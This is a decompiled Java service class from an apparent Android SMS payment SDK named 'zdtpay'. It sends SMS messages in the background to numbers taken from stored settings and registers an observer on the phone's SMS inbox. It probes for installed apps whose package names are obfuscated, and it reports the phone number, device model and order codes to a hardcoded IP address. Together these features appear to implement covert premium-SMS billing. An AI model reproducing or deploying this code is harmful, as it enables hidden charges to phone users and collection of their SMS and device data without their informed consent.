package com.zdtpay;

import android.app.Dialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.view.Display;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import com.forone.InitSendMessage;
import com.zdtpay.net.DataRequestTask;
import com.zdtpay.tools.MyLogPrinter;
import com.zdtpay.tools.f;
import com.zdtpay.tools.i;
import com.zdtpay.tools.j;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ZTbje
  extends c
{
  public static boolean j = false;
  private static ExecutorService v;
  public TextView g;
  public TextView h;
  public TextView i;
  protected SharedPreferences k;
  Handler l = new s(this);
  Handler m = new y(this);
  Handler n = new z(this);
  Handler o = new aa(this);
  String p = "SENT_SMS_ACTION_ZDTPAY";
  String q = "DELIVERED_SMS_ACTION_ZDTPAY";
  private ZDTPayParamInfo r;
  private com.zdtpay.a.a s;
  private boolean t;
  private StringBuffer u;
  private BroadcastReceiver w = new ab(this);
  private BroadcastReceiver x = new ad(this);
  
  public ZTbje() {}
  
  public static String a(Context paramContext)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    String str;
    if (b(paramContext))
    {
      str = "1";
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!c(paramContext)) {
        break label111;
      }
      str = "1";
      label41:
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!f.a(paramContext)) {
        break label117;
      }
      str = "1";
      label64:
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!d(paramContext)) {
        break label123;
      }
    }
    label111:
    label117:
    label123:
    for (paramContext = "1";; paramContext = "0")
    {
      localStringBuffer.append(paramContext);
      localStringBuffer.append("|");
      return localStringBuffer.toString();
      str = "0";
      break;
      str = "0";
      break label41;
      str = "0";
      break label64;
    }
  }
  
  public static void a(Context paramContext, String paramString)
  {
    try
    {
      MyLogPrinter.a("ZDTPayService.sendResult(code) " + paramString);
      HashMap localHashMap = new HashMap();
      localHashMap.put("os", f.f());
      localHashMap.put("model", f.c());
      localHashMap.put("code", paramString);
      DataRequestTask.a(paramContext, 0, "http://112.126.69.51/order_lost.php", localHashMap, null);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private void a(String paramString1, String paramString2, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2, Boolean paramBoolean, String paramString3)
  {
    v.execute(new w(this, paramString1, paramString2, paramBoolean, paramPendingIntent1, paramPendingIntent2, paramString3));
  }
  
  private void a(ArrayList paramArrayList, boolean paramBoolean)
  {
    this.u = new StringBuffer();
    int i2 = 0;
    int i1 = 0;
    if (i2 >= paramArrayList.size())
    {
      InitSendMessage.initMessage(this.f);
      if (i1 >= paramArrayList.size())
      {
        c(((com.zdtpay.a.b)paramArrayList.get(paramArrayList.size() - 1)).k());
        MyLogPrinter.a("短信发送成功@日限");
        a(this.f, -1, -1, ((com.zdtpay.a.b)paramArrayList.get(paramArrayList.size() - 1)).k());
      }
      i();
    }
    try
    {
      j.a(this);
      return;
    }
    catch (Exception paramArrayList) {}
    if ((((com.zdtpay.a.b)paramArrayList.get(i2)).p() == 2) && (f.d())) {
      i1 += 1;
    }
    for (;;)
    {
      i2 += 1;
      break;
      Object localObject1 = new Intent(this.p);
      ((Intent)localObject1).putExtra(com.zdtpay.tools.c.t, this.d.getString(com.zdtpay.tools.c.t + i2, ""));
      ((Intent)localObject1).putExtra(com.zdtpay.tools.c.t + "tid", ((com.zdtpay.a.b)paramArrayList.get(i2)).d());
      localObject1 = PendingIntent.getBroadcast(this, this.d.getString(com.zdtpay.tools.c.t + i2, "").hashCode(), (Intent)localObject1, 134217728);
      Object localObject2 = new Intent(this.q);
      ((Intent)localObject2).putExtra(com.zdtpay.tools.c.t, ((com.zdtpay.a.b)paramArrayList.get(i2)).d());
      localObject2 = PendingIntent.getBroadcast(this, this.d.getString(com.zdtpay.tools.c.t + i2, "").hashCode(), (Intent)localObject2, 134217728);
      MyLogPrinter.a(this.d.getString(new StringBuilder(String.valueOf(com.zdtpay.tools.c.A)).append(i2).toString(), "") + " " + this.d.getString(new StringBuilder(String.valueOf(com.zdtpay.tools.c.B)).append(i2).toString(), ""));
      String str1 = this.d.getString(com.zdtpay.tools.c.B + i2, "");
      String str2 = this.d.getString(com.zdtpay.tools.c.O + i2, "");
      String str3 = this.d.getString(com.zdtpay.tools.c.P + i2, "");
      if ((str1.equals("")) || (str1.equals("NO_ZL")))
      {
        c(((com.zdtpay.a.b)paramArrayList.get(i2)).k());
      }
      else
      {
        paramBoolean = TextUtils.isEmpty(str2);
        a(this.d.getString(com.zdtpay.tools.c.A + i2, ""), this.d.getString(com.zdtpay.tools.c.B + i2, ""), (PendingIntent)localObject1, (PendingIntent)localObject2, Boolean.valueOf(paramBoolean), str3);
        if (this.d.getString(com.zdtpay.tools.c.t + i2, "").endsWith("_x"))
        {
          int i3 = this.d.getInt(com.zdtpay.tools.c.E, 1);
          this.d.edit().putInt(com.zdtpay.tools.c.E, i3 - 1).commit();
        }
      }
    }
  }
  
  public static boolean b(Context paramContext)
  {
    try
    {
      paramContext.getPackageManager().getPackageInfo(i.a(new int[] { 28, 40, 38, 53, 42, 34, 33, 40, 40, 60, 63, 57, 53, 38, 40, 27, 34, 37, 30, 44, 26, 31, 30 }), 0);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramContext) {}
    return false;
  }
  
  public static boolean c(Context paramContext)
  {
    try
    {
      paramContext.getPackageManager().getPackageInfo(i.a(new int[] { 28, 40, 38, 53, 45, 30, 39, 28, 30, 39, 45, 53, 42, 42, 41, 34, 38, 44, 30, 28, 46, 43, 30 }), 0);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramContext) {}
    return false;
  }
  
  public static boolean d(Context paramContext)
  {
    return com.zdtpay.tools.a.a(paramContext).a();
  }
  
  private void f()
  {
    v.execute(new ae(this));
  }
  
  private void g()
  {
    v.execute(new af(this));
  }
  
  private void h()
  {
    Object localObject1;
    WindowManager.LayoutParams localLayoutParams;
    int i1;
    if (this.r.getDialogType() == 1)
    {
      localObject1 = (RelativeLayout)LayoutInflater.from(this.f).inflate(a("zdt_dialog_layout_pay", "layout"), null);
      Object localObject2 = (Button)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_cancel", "id"));
      if ((this.r.getLeft() != null) && (!this.r.getLeft().equals(""))) {
        ((Button)localObject2).setText(this.r.getLeft());
      }
      ((Button)localObject2).setOnClickListener(new ag(this));
      localObject2 = (Button)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_confirm_bt", "id"));
      if ((this.r.getRight() != null) && (!this.r.getRight().equals(""))) {
        ((Button)localObject2).setText(this.r.getRight());
      }
      ((Button)localObject2).setOnClickListener(new u(this));
      this.g = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_price_tv", "id")));
      this.g.setText(this.r.getPrice());
      this.h = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_product_tv", "id")));
      this.h.setText(this.r.getGoodsname());
      this.i = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_desc_tv", "id")));
      this.i.setText(this.r.getDescription());
      this.e = new Dialog(this.f, 16973835);
      this.e.getWindow().setType(2003);
      this.e.requestWindowFeature(1);
      this.e.setContentView((View)localObject1);
      this.e.setCanceledOnTouchOutside(false);
      this.e.setCancelable(false);
      this.e.show();
      localObject1 = ((WindowManager)this.f.getSystemService("window")).getDefaultDisplay();
      localObject2 = this.e.getWindow();
      localLayoutParams = ((Window)localObject2).getAttributes();
      ((Window)localObject2).setBackgroundDrawable(new ColorDrawable(16711680));
      localLayoutParams.gravity = 17;
      i1 = this.f.getResources().getConfiguration().orientation;
      if (i1 != 2) {
        break label476;
      }
      localLayoutParams.height = ((Display)localObject1).getHeight();
      localLayoutParams.width = ((Display)localObject1).getHeight();
    }
    for (;;)
    {
      this.e.getWindow().setAttributes(localLayoutParams);
      return;
      localObject1 = (RelativeLayout)LayoutInflater.from(this.f).inflate(a("zdt_dialog_layout_pay_type_twobtn", "layout"), null);
      break;
      label476:
      if (i1 == 1) {
        localLayoutParams.width = ((int)(((Display)localObject1).getWidth() * 0.8D));
      }
    }
  }
  
  private void i()
  {
    k localK = new k(this, new v(this), this.s.d());
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, localK);
  }
  
  public void a(Context paramContext, int paramInt1, int paramInt2, String paramString)
  {
    try
    {
      MyLogPrinter.a("ZDTPayService.sendResult()" + paramInt1 + " " + paramInt2 + " " + paramString);
      HashMap localHashMap = new HashMap();
      localHashMap.put("os", f.f());
      localHashMap.put("model", f.c());
      localHashMap.put("t1", paramInt1);
      localHashMap.put("t2", paramInt2);
      localHashMap.put("order", paramString);
      DataRequestTask.a(paramContext, 0, "http://112.126.69.51/rixian.php", localHashMap, null, 1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public void a(HashMap paramHashMap)
  {
    DataRequestTask.a(this, 0, DataRequestTask.h, paramHashMap, null);
  }
  
  public void c(String paramString)
  {
    if (com.zdtpay.tools.b.a != null)
    {
      HashMap localHashMap = new HashMap();
      localHashMap.put("isLast", "0");
      localHashMap.put("code", "1");
      localHashMap.put("paymoney", this.r.getPrice());
      localHashMap.put("err_msg", "");
      localHashMap.put("extra", this.r.getExtra());
      localHashMap.put("order", paramString);
      com.zdtpay.tools.b.a.onSuccess(localHashMap);
    }
  }
  
  public void d()
  {
    f();
    g();
  }
  
  public void e()
  {
    String str = this.d.getString(com.zdtpay.tools.c.o, "13800138000");
    Object localObject = str;
    if (str.equals("13800138000")) {
      localObject = f.e(this.f);
    }
    this.r.setMobile((String)localObject);
    this.r.setMobile_type(f.j(this.f));
    localObject = new HashMap();
    ((HashMap)localObject).put(com.zdtpay.tools.c.q, this.r.getPrice());
    ((HashMap)localObject).put(com.zdtpay.tools.c.s, this.r.getGoodsname());
    ((HashMap)localObject).put(com.zdtpay.tools.c.u, this.r.getExtra());
    ((HashMap)localObject).put(com.zdtpay.tools.c.v, this.r.getDescription());
    ((HashMap)localObject).put(com.zdtpay.tools.c.w, this.r.getJfdbz());
    ((HashMap)localObject).put("soft", a(this.f));
    ((HashMap)localObject).put("soft_data", f.c());
    ((HashMap)localObject).put("time", System.currentTimeMillis());
    a("加载中...");
    DataRequestTask.a(this, 0, DataRequestTask.d, (HashMap)localObject, new x(this));
    a(this.f, "a");
  }
  
  public void onCreate()
  {
    super.onCreate();
    if (!this.t)
    {
      this.t = true;
      registerReceiver(this.w, new IntentFilter(this.p));
      registerReceiver(this.x, new IntentFilter(this.q));
    }
    this.k = getSharedPreferences("migu", 0);
  }
  
  public void onDestroy()
  {
    if (this.t)
    {
      this.t = false;
      unregisterReceiver(this.w);
      unregisterReceiver(this.x);
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent == null) {
      return 2;
    }
    if (!f.d(this.f))
    {
      b("无网络连接");
      paramIntent = new HashMap();
      paramIntent.put("code", "-2");
      paramIntent.put("err_msg", "无网络");
      paramIntent.put("isLast", "1");
      com.zdtpay.tools.b.a.onFail(paramIntent);
      a();
      return 2;
    }
    if (!f.a(this.f))
    {
      b("无有效SIM卡");
      paramIntent = new HashMap();
      paramIntent.put("code", "-3");
      paramIntent.put("err_msg", "无sim卡");
      paramIntent.put("isLast", "1");
      com.zdtpay.tools.b.a.onFail(paramIntent);
      a();
      return 2;
    }
    this.r = com.zdtpay.tools.b.d;
    int i1 = this.d.getInt(com.zdtpay.tools.c.J + "pay", 0);
    if ((j) && (i1 >= 1))
    {
      System.out.println("zdtpay:limit>1)");
      return 2;
    }
    this.d.edit().putInt(com.zdtpay.tools.c.J + "pay", i1 + 1).commit();
    if (v == null) {
      v = Executors.newCachedThreadPool();
    }
    d();
    if (!this.t)
    {
      this.t = true;
      registerReceiver(this.w, new IntentFilter(this.p));
      registerReceiver(this.x, new IntentFilter(this.q));
    }
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
